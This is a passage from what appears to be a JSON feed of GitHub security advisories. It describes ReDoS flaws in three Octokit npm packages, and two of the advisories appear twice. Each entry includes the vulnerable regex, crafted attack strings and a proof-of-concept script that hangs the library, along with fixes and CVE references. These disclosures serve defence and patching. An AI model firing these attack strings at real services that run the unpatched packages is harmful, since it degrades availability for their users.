\"@octokit/plugin-paginate-rest\";\n\nconst MyOctokit = Octokit.plugin(paginateRest);\nconst octokit = new MyOctokit({\n  auth: \"your-github-token\",\n});\n\n// Intercept the request to inject a malicious 'link' header for ReDoS\noctokit.hook.wrap(\"request\", async (request, options) =&gt; {\n  const maliciousLinkHeader = \"\" + \"&lt;\".repeat(100000) + \"&gt;\"; // attack string\n  return {\n    data: [],\n    headers: {\n      link: maliciousLinkHeader, // Inject malicious 'link' header\n    },\n  };\n});\n\n// Trigger the ReDoS attack by paginating through GitHub issues\n(async () =&gt; {\n  try {\n    for await (const normalizedResponse of octokit.paginate.iterator(\n      \"GET /repos/{owner}/{repo}/issues\", { owner: \"DayShift\", repo: \"ReDos\", per_page: 100 }\n    )) {\n      console.log({ normalizedResponse });\n    }\n  } catch (error) {\n    console.error(\"Error encountered:\", error);\n  }\n})();\n</code></pre>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/619c030e-5473-4a26-9e2a-4b9a26c1563b\"></p>\n<h3 id=\"impact\">Impact</h3>\n<h4 id=\"what-kind-of-vulnerability-is-it\">What kind of vulnerability is it?</h4>\n<p>This is a <em>Regular Expression Denial of Service (ReDoS) vulnerability</em>, which occurs due to excessive backtracking in the regex pattern:</p>\n<pre><code class=\"language-js\">/&lt;([^&gt;]+)&gt;;\\s*rel=\"next\"/\n</code></pre>\n<p>When processing a specially crafted <code>Link</code> header, this regex can cause significant performance degradation, leading to high CPU utilization and potential service unresponsiveness.</p>\n<h4 id=\"who-is-impacted\">Who is impacted?</h4>\n<ul>\n<li>Users of <code>@octokit/plugin-paginate-rest</code> who call <code>octokit.paginate.iterator()</code> and process untrusted or manipulated <code>Link</code> headers.</li>\n<li>Applications relying on Octokit's pagination mechanism, particularly those handling large volumes of API requests.</li>\n<li>GitHub API consumers who integrate this package into their projects for paginated data retrieval.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/octokit/plugin-paginate-rest.js/security/advisories/GHSA-h5c3-5r3r-rr8q\">https://github.com/octokit/plugin-paginate-rest.js/security/advisories/GHSA-h5c3-5r3r-rr8q</a></li>\n<li><a href=\"https://github.com/octokit/plugin-paginate-rest.js/commit/bb6c4f945d8023902cf387391d2b2209261044ab\">https://github.com/octokit/plugin-paginate-rest.js/commit/bb6c4f945d8023902cf387391d2b2209261044ab</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25288\">https://nvd.nist.gov/vuln/detail/CVE-2025-25288</a></li>\n<li><a href=\"https://github.com/octokit/plugin-paginate-rest.js/blob/main/src/iterator.ts\">https://github.com/octokit/plugin-paginate-rest.js/blob/main/src/iterator.ts</a></li>\n<li><a href=\"https://github.com/octokit/plugin-paginate-rest.js/releases/tag/v9.2.2\">https://github.com/octokit/plugin-paginate-rest.js/releases/tag/v9.2.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h5c3-5r3r-rr8q\">https://github.com/advisories/GHSA-h5c3-5r3r-rr8q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h5c3-5r3r-rr8q",
            "title": "[@octokit/plugin-paginate-rest] @octokit/plugin-paginate-rest has a Regular Expression in iterator Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
            "date_modified": "2025-02-18T19:15:06.000Z",
            "date_published": "2025-02-14T17:57:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h5c3-5r3r-rr8q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Regular Expression Denial of Service (ReDoS) vulnerability exists in the processing of HTTP request headers. By sending an authorization header containing an excessively long sequence of spaces followed by a newline and \"@\", an attacker can exploit inefficient regular expression processing, leading to excessive resource consumption. This can significantly degrade server performance or cause a denial-of-service (DoS) condition, impacting availability.</p>\n<h3 id=\"details\">Details</h3>\n<p>The issue occurs at <a href=\"https://github.com/octokit/request-error.js/blob/main/src/index.ts\">line 52</a> of iterator.ts in the @octokit/request-error repository.\nThe vulnerability is caused by the use of an inefficient regular expression in the handling of the <code>authorization</code> header within the request processing logic:</p>\n<pre><code class=\"language-js\">authorization: options.request.headers.authorization.replace(\n  / .*$/, \n  \" [REDACTED]\"\n)\n</code></pre>\n<p>The regular expression <code>/ .*$/</code> matches a space followed by any number of characters until the end of the line. This pattern is vulnerable to Regular Expression Denial of Service (ReDoS) when processing specially crafted input. Specifically, an attacker can send an <code>authorization</code> header containing a long sequence of spaces followed by a newline and \"@\", such as:</p>\n<pre><code class=\"language-js\">headers: {\n  authorization: \"\" + \" \".repeat(100000) + \"\\n@\",\n}\n</code></pre>\n<p>Due to the way JavaScript's regular expression engine backtracks while attempting to match the space followed by arbitrary characters, this input can cause excessive CPU usage, significantly slowing down or even freezing the server. This leads to a denial-of-service condition, impacting availability.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://gist.github.com/ShiyuBanzhou/e1203ad22701fd043b8501eb37676a0d\">The gist of PoC.js</a></p>\n<ol>\n<li>run npm i @octokit/request-error</li>\n<li>run 'node poc.js'\nresult:</li>\n<li>then the program will stuck forever with high CPU usage</li>\n</ol>\n<pre><code class=\"language-js\">import { RequestError } from \"@octokit/request-error\";\n\nconst error = new RequestError(\"Oops\", 500, {\n  request: {\n    method: \"POST\",\n    url: \"https://api.github.com/foo\",\n    body: {\n      bar: \"baz\",\n    },\n    headers: {\n      authorization: \"\"+\" \".repeat(100000)+\"\\n@\",\n    },\n  },\n  response: {\n    status: 500,\n    url: \"https://api.github.com/foo\",\n    headers: {\n      \"x-github-request-id\": \"1:2:3:4\",\n    },\n    data: {\n      foo: \"bar\",\n    },\n  },\n});\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<h4 id=\"vulnerability-type--impact\">Vulnerability Type &amp; Impact:</h4>\n<p>This is a <code>Regular Expression Denial of Service (ReDoS) vulnerability</code>, which occurs due to an inefficient regular expression (<code>/ .*$/</code>) used to sanitize the <code>authorization</code> header. An attacker can craft a malicious input that triggers excessive backtracking in the regex engine, leading to high CPU consumption and potential denial-of-service (DoS).</p>\n<h4 id=\"who-is-impacted\">Who is Impacted?</h4>\n<ul>\n<li>Projects or services using this code to process HTTP headers are vulnerable.</li>\n<li>Applications that rely on user-supplied <code>authorization</code> headers are at risk, especially those processing a large volume of authentication requests.</li>\n<li>Multi-tenant or API-driven platforms could experience degraded performance or service outages if exploited at scale.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/octokit/request-error.js/security/advisories/GHSA-xx4v-prfh-6cgc\">https://github.com/octokit/request-error.js/security/advisories/GHSA-xx4v-prfh-6cgc</a></li>\n<li><a href=\"https://github.com/octokit/request-error.js/commit/d558320874a4bc8d356babf1079e6f0056a59b9e\">https://github.com/octokit/request-error.js/commit/d558320874a4bc8d356babf1079e6f0056a59b9e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25289\">https://nvd.nist.gov/vuln/detail/CVE-2025-25289</a></li>\n<li><a href=\"https://github.com/octokit/request-error.js/blob/main/src/index.ts\">https://github.com/octokit/request-error.js/blob/main/src/index.ts</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xx4v-prfh-6cgc\">https://github.com/advisories/GHSA-xx4v-prfh-6cgc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xx4v-prfh-6cgc",
            "title": "[@octokit/request-error] @octokit/request-error has a Regular Expression in index that Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
            "date_modified": "2025-02-14T23:07:30.000Z",
            "date_published": "2025-02-14T17:58:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xx4v-prfh-6cgc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Regular Expression Denial of Service (ReDoS) vulnerability exists in the processing of HTTP request headers. By sending an authorization header containing an excessively long sequence of spaces followed by a newline and \"@\", an attacker can exploit inefficient regular expression processing, leading to excessive resource consumption. This can significantly degrade server performance or cause a denial-of-service (DoS) condition, impacting availability.</p>\n<h3 id=\"details\">Details</h3>\n<p>The issue occurs at <a href=\"https://github.com/octokit/request-error.js/blob/main/src/index.ts\">line 52</a> of iterator.ts in the @octokit/request-error repository.\nThe vulnerability is caused by the use of an inefficient regular expression in the handling of the <code>authorization</code> header within the request processing logic:</p>\n<pre><code class=\"language-js\">authorization: options.request.headers.authorization.replace(\n  / .*$/, \n  \" [REDACTED]\"\n)\n</code></pre>\n<p>The regular expression <code>/ .*$/</code> matches a space followed by any number of characters until the end of the line. This pattern is vulnerable to Regular Expression Denial of Service (ReDoS) when processing specially crafted input. Specifically, an attacker can send an <code>authorization</code> header containing a long sequence of spaces followed by a newline and \"@\", such as:</p>\n<pre><code class=\"language-js\">headers: {\n  authorization: \"\" + \" \".repeat(100000) + \"\\n@\",\n}\n</code></pre>\n<p>Due to the way JavaScript's regular expression engine backtracks while attempting to match the space followed by arbitrary characters, this input can cause excessive CPU usage, significantly slowing down or even freezing the server. This leads to a denial-of-service condition, impacting availability.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://gist.github.com/ShiyuBanzhou/e1203ad22701fd043b8501eb37676a0d\">The gist of PoC.js</a></p>\n<ol>\n<li>run npm i @octokit/request-error</li>\n<li>run 'node poc.js'\nresult:</li>\n<li>then the program will stuck forever with high CPU usage</li>\n</ol>\n<pre><code class=\"language-js\">import { RequestError } from \"@octokit/request-error\";\n\nconst error = new RequestError(\"Oops\", 500, {\n  request: {\n    method: \"POST\",\n    url: \"https://api.github.com/foo\",\n    body: {\n      bar: \"baz\",\n    },\n    headers: {\n      authorization: \"\"+\" \".repeat(100000)+\"\\n@\",\n    },\n  },\n  response: {\n    status: 500,\n    url: \"https://api.github.com/foo\",\n    headers: {\n      \"x-github-request-id\": \"1:2:3:4\",\n    },\n    data: {\n      foo: \"bar\",\n    },\n  },\n});\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<h4 id=\"vulnerability-type--impact\">Vulnerability Type &amp; Impact:</h4>\n<p>This is a <code>Regular Expression Denial of Service (ReDoS) vulnerability</code>, which occurs due to an inefficient regular expression (<code>/ .*$/</code>) used to sanitize the <code>authorization</code> header. An attacker can craft a malicious input that triggers excessive backtracking in the regex engine, leading to high CPU consumption and potential denial-of-service (DoS).</p>\n<h4 id=\"who-is-impacted\">Who is Impacted?</h4>\n<ul>\n<li>Projects or services using this code to process HTTP headers are vulnerable.</li>\n<li>Applications that rely on user-supplied <code>authorization</code> headers are at risk, especially those processing a large volume of authentication requests.</li>\n<li>Multi-tenant or API-driven platforms could experience degraded performance or service outages if exploited at scale.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/octokit/request-error.js/security/advisories/GHSA-xx4v-prfh-6cgc\">https://github.com/octokit/request-error.js/security/advisories/GHSA-xx4v-prfh-6cgc</a></li>\n<li><a href=\"https://github.com/octokit/request-error.js/commit/d558320874a4bc8d356babf1079e6f0056a59b9e\">https://github.com/octokit/request-error.js/commit/d558320874a4bc8d356babf1079e6f0056a59b9e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25289\">https://nvd.nist.gov/vuln/detail/CVE-2025-25289</a></li>\n<li><a href=\"https://github.com/octokit/request-error.js/blob/main/src/index.ts\">https://github.com/octokit/request-error.js/blob/main/src/index.ts</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xx4v-prfh-6cgc\">https://github.com/advisories/GHSA-xx4v-prfh-6cgc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xx4v-prfh-6cgc",
            "title": "[@octokit/request-error] @octokit/request-error has a Regular Expression in index that Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
            "date_modified": "2025-02-14T23:07:30.000Z",
            "date_published": "2025-02-14T17:58:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xx4v-prfh-6cgc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>By crafting specific <code>options</code> parameters, the <code>endpoint.parse(options)</code> call can be triggered, leading to a regular expression denial-of-service (ReDoS) attack. This causes the program to hang and results in high CPU utilization.</p>\n<h3 id=\"details\">Details</h3>\n<p>The issue occurs in the <code>parse</code> function within the <code>parse.ts</code> file of the npm package <code>@octokit/endpoint</code>. The specific code is located at the following link: <a href=\"https://github.com/octokit/endpoint.js/blob/main/src/parse.ts\">https://github.com/octokit/endpoint.js/blob/main/src/parse.ts</a>, at line 62:</p>\n<pre><code class=\"language-ts\">headers.accept.match(/[\\w-]+(?=-preview)/g) || ([] as string[]);\n</code></pre>\n<p>The regular expression <code>/[\\w-]+(?=-preview)/g</code> encounters a backtracking issue when it processes <code>a large number of characters</code> followed by the <code>-</code> symbol.\ne.g., the attack string: </p>\n<pre><code class=\"language-js\">\"\" + \"A\".repeat(100000) + \"-\"\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://gist.github.com/ShiyuBanzhou/a17202ac1ad403a80ca302466d5e56c4\">The gist</a>\nHere is the reproduction process for the vulnerability:</p>\n<ol>\n<li>run 'npm i @octokit/endpoint'</li>\n<li>Move <code>poc.js</code> to the root directory of the same level as <code>README.md</code></li>\n<li>run 'node poc.js'\nresult:</li>\n<li>then the program will stuck forever with high CPU usage</li>\n</ol>\n<pre><code class=\"language-js\">import { endpoint } from \"@octokit/endpoint\";\n// import { parse } from \"./node_modules/@octokit/endpoint/dist-src/parse.js\";\nconst options = {  \n  method: \"POST\",\n  url: \"/graphql\", // Ensure that the URL ends with \"/graphql\"\n  headers: {\n    accept: \"\" + \"A\".repeat(100000) + \"-\", // Pass in the attack string\n    \"content-type\": \"text/plain\",\n  },\n  mediaType: {\n    previews: [\"test-preview\"], // Ensure that mediaType.previews exists and has values\n    format: \"raw\", // Optional media format\n  },\n  baseUrl: \"https://api.github.com\",\n};\n\nconst startTime = performance.now();\nendpoint.parse(options);\nconst endTime = performance.now();\nconst duration = endTime - startTime;\nconsole.log(`Endpoint execution time: ${duration} ms`);\n</code></pre>\n<ol>\n<li><p><strong>Import the <code>endpoint</code> module</strong>: First, import the <code>endpoint</code> module from the npm package <code>@octokit/endpoint</code>, which is used for handling GitHub API requests.</p>\n</li>\n<li><p><strong>Construct the <code>options</code> object that triggers a ReDoS attack</strong>: The following member variables are critical in constructing the <code>options</code> object:</p>\n</li>\n</ol>\n<ul>\n<li><code>url</code>: Set to <code>\"/graphql\"</code>, ensuring the URL ends with <code>/graphql</code> to match the format for GitHub's GraphQL API.</li>\n<li><code>headers</code>:<blockquote>\n<p><code>accept</code>: A long attack string is crafted with <code>\"A\".repeat(100000) + \"-\"</code>, which will be passed to the regular expression and cause a backtracking attack (ReDoS).</p>\n</blockquote>\n</li>\n<li><code>mediaType</code>:<blockquote>\n<p><code>previews</code>: Set to <code>[\"test-preview\"]</code>, ensuring <code>mediaType.previews</code> exists and has values.</p>\n<p><code>format</code>: Set to <code>\"raw\"</code>, indicating raw data format.</p>\n</blockquote>\n</li>\n</ul>\n<ol start=\"3\">\n<li><p><strong>Call the <code>endpoint.parse(options)</code> function and record the time</strong>: Call the <code>endpoint.parse(options)</code> function and use <code>performance.now()</code> to record the start and end times, measuring the execution duration.</p>\n</li>\n<li><p><strong>Calculate the time difference and output it</strong>: Compute the difference between the start and end times and output it using <code>console.log</code>. When the attack string length reaches 100000, the response time typically exceeds 10000 milliseconds, satisfying the characteristic condition for a ReDoS attack, where response times dramatically increase.</p>\n<img src=\"https://github.com/user-attachments/assets/9fc865a4-e150-42d5-bcd5-93ab6b0c29ef\" alt=\"2\" width=\"800\"></li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<h4 id=\"what-kind-of-vulnerability-is-it\">What kind of vulnerability is it?</h4>\n<p>This is a <strong>Regular Expression Denial of Service (ReDoS)</strong> vulnerability. It arises from inefficient regular expressions that can cause excessive backtracking when processing certain inputs. Specifically, the regular expression <code>/[\\w-]+(?=-preview)/g</code> is vulnerable because it attempts to match long strings of characters followed by a hyphen (<code>-</code>), which leads to inefficient backtracking when provided with specially crafted attack strings. This backtracking results in high CPU utilization, causing the application to become unresponsive and denying service to legitimate users.</p>\n<h4 id=\"who-is-impacted\">Who is impacted?</h4>\n<p>This vulnerability impacts any application that uses the affected regular expression in conjunction with user-controlled inputs, particularly where large or maliciously crafted strings can trigger excessive backtracking.\nIn addition to directly affecting applications using the <code>@octokit/endpoint package</code>, the impact is more widespread because <code>@octokit/endpoint</code> is a library used to wrap REST APIs, including GitHub's API. This means that any system or service built on top of this library that interacts with GitHub or other REST APIs could be vulnerable. Given the extensive use of this package in API communication, the potential for exploitation is broad and serious. The vulnerability could affect a wide range of applications, from small integrations to large enterprise-level systems, especially those relying on the package to handle API requests.\nAttackers can exploit this vulnerability to cause performance degradation, downtime, and service disruption, making it a critical issue for anyone using the affected version of <code>@octokit/endpoint</code>.</p>\n<h3 id=\"solution\">Solution</h3>\n<p>To resolve the ReDoS vulnerability, the regular expression should be updated to avoid excessive backtracking. By modifying the regular expression to <code>(?&lt;![\\w-])[\\w-]+(?=-preview)</code>, we prevent the issue.\nHere is how this change solves the problem:\nHere is how this change solves the problem:</p>\n<ol>\n<li><strong>Old Regular Expression</strong>: <code>/[\\w-]+(?=-preview)/g</code></li>\n</ol>\n<ul>\n<li>This regular expression matches any sequence of word characters (<code>\\w</code>) and hyphens (<code>-</code>) followed by <code>-preview</code>.</li>\n<li>The issue arises when the regex engine encounters a long string of characters followed by a <code>-</code>, causing excessive backtracking and high CPU usage.</li>\n</ul>\n<ol start=\"2\">\n<li><strong>New Regular Expression</strong>: <code>(?&lt;![\\w-])[\\w-]+(?=-preview)</code></li>\n</ol>\n<ul>\n<li>This updated regular expression uses a negative lookbehind <code>(?&lt;![\\w-])</code>, ensuring that the matched string is not preceded by any word characters or hyphens (<code>\\w</code> or <code>-</code>).</li>\n<li>The new expression still matches sequences of word characters and hyphens, but the negative lookbehind ensures it doesn't cause backtracking issues when processing long attack strings.</li>\n<li>By adding this lookbehind, we effectively prevent the vulnerability, ensuring the regex operates efficiently without excessive backtracking.</li>\n</ul>\n<h4 id=\"full-solution-example\">Full Solution Example:</h4>\n<p>The specific code is located at the following link: <a href=\"https://github.com/octokit/endpoint.js/blob/main/src/parse.ts\">https://github.com/octokit/endpoint.js/blob/main/src/parse.ts</a>, at line 62:</p>\n<ol>\n<li><strong>Update the Regular Expression</strong>: In the <code>parse.ts</code> file (or wherever the original regex is defined), replace the existing regular expression:</li>\n</ol>\n<pre><code class=\"language-ts\">const previewsFromAcceptHeader =\n          headers.accept.match(/[\\w-]+(?=-preview)/g) || ([] as string[]);\n</code></pre>\n<p>With the updated one:</p>\n<pre><code class=\"language-ts\">const previewsFromAcceptHeader =\n          headers.accept.match(/(?&lt;![\\w-])[\\w-]+(?=-preview)/g) || ([] as string[]);\n</code></pre>\n<ol start=\"2\">\n<li><strong>Test the Change</strong>: After updating the regular expression, thoroughly test the application with both regular and malicious inputs to ensure that:</li>\n</ol>\n<ul>\n<li>The functionality remains correct and the expected matches still occur.</li>\n<li>The performance improves and the ReDoS vulnerability no longer occurs when handling large attack strings.</li>\n</ul>\n<ol start=\"3\">\n<li><strong>Deploy the Fix</strong>: Once the solution is verified, deploy the fix to your production environment to protect against potential attacks.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/octokit/endpoint.js/security/advisories/GHSA-x4c5-c7rf-jjgv\">https://github.com/octokit/endpoint.js/security/advisories/GHSA-x4c5-c7rf-jjgv</a></li>\n<li><a href=\"https://github.com/octokit/endpoint.js/commit/6c9c5be033c450d436efb37de41b6470c22f7db8\">https://github.com/octokit/endpoint.js/commit/6c9c5be033c450d436efb37de41b6470c22f7db8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25285\">https://nvd.nist.gov/vuln/detail/CVE-2025-25285</a></li>\n<li><a href=\"https://github.com/octokit/endpoint.js/blob/main/src/parse.ts\">https://github.com/octokit/endpoint.js/blob/main/src/parse.ts</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x4c5-c7rf-jjgv\">https://github.com/advisories/GHSA-x4c5-c7rf-jjgv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x4c5-c7rf-jjgv",
            "title": "[@octokit/endpoint] @octokit/endpoint has a Regular Expression in parse that Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
            "date_modified": "2025-02-14T22:19:52.000Z",
            "date_published": "2025-02-14T17:56:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x4c5-c7rf-jjgv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>By crafting specific <code>options</code> parameters, the <code>endpoint.parse(options)</code> call can be triggered, leading to a regular expression denial-of-service (ReDoS) attack. This causes the program to hang and results in high CPU utilization.</p>\n<h3 id=\"details\">Details</h3>\n<p>The issue occurs in the <code>parse</code> function within the <code>parse.ts</code> file of the npm package <code>@octokit/endpoint</code>. The specific code is located at the following link: <a href=\"https://github.com/octokit/endpoint.js/blob/main/src/parse.ts\">https://github.com/octokit/endpoint.js/blob/main/src/parse.ts</a>, at line 62:</p>\n<pre><code class=\"language-ts\">headers.accept.match(/[\\w-]+(?=-preview)/g) || ([] as string[]);\n</code></pre>\n<p>The regular expression <code>/[\\w-]+(?=-preview)/g</code> encounters a backtracking issue when it processes <code>a large number of characters</code> followed by the <code>-</code> symbol.\ne.g., the attack string: </p>\n<pre><code class=\"language-js\">\"\" + \"A\".repeat(100000) + \"-\"\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://gist.github.com/ShiyuBanzhou/a17202ac1ad403a80ca302466d5e56c4\">The gist</a>\nHere is the reproduction process for the vulnerability:</p>\n<ol>\n<li>run 'npm i @octokit/endpoint'</li>\n<li>Move <code>poc.js</code> to the root directory of the same level as <code>README.md</code></li>\n<li>run 'node poc.js'\nresult:</li>\n<li>then the program will stuck forever with high CPU usage</li>\n</ol>\n<pre><code class=\"language-js\">import { endpoint } from \"@octokit/endpoint\";\n// import { parse } from \"./node_modules/@octokit/endpoint/dist-src/parse.js\";\nconst options = {  \n  method: \"POST\",\n  url: \"/graphql\", // Ensure that the URL ends with \"/graphql\"\n  headers: {\n    accept: \"\" + \"A\".repeat(100000) + \"-\", // Pass in the attack string\n    \"content-type\": \"text/plain\",\n  },\n  mediaType: {\n    previews: [\"test-preview\"], // Ensure that mediaType.previews exists and has values\n    format: \"raw\", // Optional media format\n  },\n  baseUrl: \"https://api.github.com\",\n};\n\nconst startTime = performance.now();\nendpoint.parse(options);\nconst endTime = performance.now();\nconst duration = endTime - startTime;\nconsole.log(`Endpoint execution time: ${duration} ms`);\n</code></pre>\n<ol>\n<li><p><strong>Import the <code>endpoint</code> module</strong>: First, import the <code>endpoint</code> module from the npm package <code>@octokit/endpoint</code>, which is used for handling GitHub API requests.</p>\n</li>\n<li><p><strong>Construct the <code>options</code> object that triggers a ReDoS attack</strong>: The following member variables are critical in constructing the <code>options</code> object:</p>\n</li>\n</ol>\n<ul>\n<li><code>url</code>: Set to <code>\"/graphql\"</code>, ensuring the URL ends with <code>/graphql</code> to match the format for GitHub's GraphQL API.</li>\n<li><code>headers</code>:<blockquote>\n<p><code>accept</code>: A long attack string is crafted with <code>\"A\".repeat(100000) + \"-\"</code>, which will be passed to the regular expression and cause a backtracking attack (ReDoS).</p>\n</blockquote>\n</li>\n<li><code>mediaType</code>:<blockquote>\n<p><code>previews</code>: Set to <code>[\"test-preview\"]</code>, ensuring <code>mediaType.previews</code> exists and has values.</p>\n<p><code>format</code>: Set to <code>\"raw\"</code>, indicating raw data format.</p>\n</blockquote>\n</li>\n</ul>\n<ol start=\"3\">\n<li><p><strong>Call the <code>endpoint.parse(options)</code> function and record the time</strong>: Call the <code>endpoint.parse(options)</code> function and use <code>performance.now()</code> to record the start and end times, measuring the execution duration.</p>\n</li>\n<li><p><strong>Calculate the time difference and output it</strong>: Compute the difference between the start and end times and output it using <code>console.log</code>. When the attack string length reaches 100000, the response time typically exceeds 10000 milliseconds, satisfying the characteristic condition for a ReDoS attack, where response times dramatically increase.</p>\n<img src=\"https://github.com/user-attachments/assets/9fc865a4-e150-42d5-bcd5-93ab6b0c29ef\" alt=\"2\" width=\"800\"></li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<h4 id=\"what-kind-of-vulnerability-is-it\">What kind of vulnerability is it?</h4>\n<p>This is a <strong>Regular Expression Denial of Service (ReDoS)</strong> vulnerability. It arises from inefficient regular expressions that can cause excessive backtracking when processing certain inputs. Specifically, the regular expression <code>/[\\w-]+(?=-preview)/g</code> is vulnerable because it attempts to match long strings of characters followed by a hyphen (<code>-</code>), which leads to inefficient backtracking when provided with specially crafted attack strings. This backtracking results in high CPU utilization, causing the application to become unresponsive and denying service to legitimate users.</p>\n<h4 id=\"who-is-impacted\">Who is impacted?</h4>\n<p>This vulnerability impacts any application that uses the affected regular expression in conjunction with user-controlled inputs, particularly where large or maliciously crafted strings can trigger excessive backtracking.\nIn addition to directly affecting applications using the <code>@octokit/endpoint package</code>, the impact is more widespread because <code>@octokit/endpoint</code> is a library used to wrap REST APIs, including GitHub's API. This means that any system or service built on top of this library that interacts with GitHub or other REST APIs could be vulnerable. Given the extensive use of this package in API communication, the potential for exploitation is broad and serious. The vulnerability could affect a wide range of applications, from small integrations to large enterprise-level systems, especially those relying on the package to handle API requests.\nAttackers can exploit this vulnerability to cause performance degradation, downtime, and service disruption, making it a critical issue for anyone using the affected version of <code>@octokit/endpoint</code>.</p>\n<h3 id=\"solution\">Solution</h3>\n<p>To resolve the ReDoS vulnerability, the regular expression should be updated to avoid excessive backtracking. By modifying the regular expression to <code>(?&lt;![\\w-])[\\w-]+(?=-preview)</code>, we prevent the issue.\nHere is how this change solves the problem:\nHere is how this change solves the problem:</p>\n<ol>\n<li><strong>Old Regular Expression</strong>: <code>/[\\w-]+(?=-preview)/g</code></li>\n</ol>\n<ul>\n<li>This regular expression matches any sequence of word characters (<code>\\w</code>) and hyphens (<code>-</code>) followed by <code>-preview</code>.</li>\n<li>The issue arises when the regex engine encounters a long string of characters followed by a <code>-</code>, causing excessive backtracking and high CPU usage.</li>\n</ul>\n<ol start=\"2\">\n<li><strong>New Regular Expression</strong>: <code>(?&lt;![\\w-])[\\w-]+(?=-preview)</code></li>\n</ol>\n<ul>\n<li>This updated regular expression uses a negative lookbehind <code>(?&lt;![\\w-])</code>, ensuring that the matched string is not preceded by any word characters or hyphens (<code>\\w</code> or <code>-</code>).</li>\n<li>The new expression still matches sequences of word characters and hyphens, but the negative lookbehind ensures it doesn't cause backtracking issues when processing long attack strings.</li>\n<li>By adding this lookbehind, we effectively prevent the vulnerability, ensuring the regex operates efficiently without excessive backtracking.</li>\n</ul>\n<h4 id=\"full-solution-example\">Full Solution Example:</h4>\n<p>The specific code is located at the following link: <a href=\"https://github.com/octokit/endpoint.js/blob/main/src/parse.ts\">https://github.com/octokit/endpoint.js/blob/main/src/parse.ts</a>, at line 62:</p>\n<ol>\n<li><strong>Update the Regular Expression</strong>: In the <code>parse.ts</code> file (or wherever the original regex is defined), replace the existing regular expression:</li>\n</ol>\n<pre><code class=\"language-ts\">const previewsFromAcceptHeader =\n          headers.accept.match(/[\\w-]+(?=-preview)/g) || ([] as string[]);\n</code></pre>\n<p>With the updated one:</p>\n<pre><code class=\"language-ts\">const previewsFromAcceptHeader =\n          headers.accept.match(/(?&lt;![\\w-])[\\w-]+(?=-preview)/g) || ([] as string[]);\n</code></pre>\n<ol start=\"2\">\n<li><strong>Test the Change</strong>: After updating the regular expression, thoroughly test the application with both regular and malicious inputs to ensure that:</li>\n</ol>\n<ul>\n<li>The functionality remains correct and the expected matches still occur.</li>\n<li>The performance improves and the ReDoS vulnerability no longer occurs when handling large attack strings.</li>\n</ul>\n<ol start=\"3\">\n<li><strong>Deploy the Fix</strong>: Once the solution is verified, deploy the fix to your production environment to protect against potential attacks.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/octokit/endpoint.js/security/advisories/GHSA-x4c5-c7rf-jjgv\">https://github.com/octokit/endpoint.js/security/advisories/GHSA-x4c5-c7rf-jjgv</a></li>\n<li><a href=\"https://github.com/octokit/endpoint.js/commit/6c9c5be033c450d436efb37de41b6470c22f7db8\">https://github.com/octokit/endpoint.js/commit/6c9c5be033c450d436efb37de41b6470c22f7db8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25285\">https://nvd.nist.gov/vuln/detail/CVE-2025-25285</a></li>\n<li><a href=\"https://github.com/octokit/endpoint.js/blob/main/src/parse.ts\">https://github.com/octokit/endpoint.js/blob/main/src/parse.ts</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x4c5-c7rf-jjgv\">https://github.com/advisories/GHSA-x4c5-c7rf-jjgv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x4c5-c7rf-jjgv",
            "title": "[@octokit/endpoint] @octokit/endpoint has a Regular Expression in parse that Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
            "date_modified": "2025-02-14T22:19:52.000Z",
            "date_published": "2025-02-14T17:56:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x4c5-c7rf-jjgv"
            },
            "tags": [
                "severity"
            ]
        },
        {
